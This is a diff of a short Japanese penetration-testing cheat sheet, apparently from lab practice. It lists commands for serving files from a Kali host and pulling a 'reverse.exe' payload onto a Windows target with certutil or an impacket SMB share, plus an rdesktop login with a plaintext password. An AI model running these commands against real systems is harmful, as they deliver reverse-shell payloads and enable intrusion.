@@ -1,12 +1,16 @@
-1. Server から　Client へのダウンロード (IE使えないとき)
+1. ファイル転送したいとき
+1-1. Server から　Client へのダウンロード (IE使えないとき)
 # Server
 sudo python -m SimpleHTTPServer 80
 sudo python3 -m http.server 80
 # Client
 certutil -f -split -urlcache http://10.9.2.110:80/reverse.exe reverse.exe
 
-2. SMB 使う
+1-2. SMB 使う
 # Server
 sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
 # Client
 copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
+
+3. rdesktop したいとき
+rdesktop 10.10.249.154 -u user -p password321 -k ja -r disk:share=./tmp 
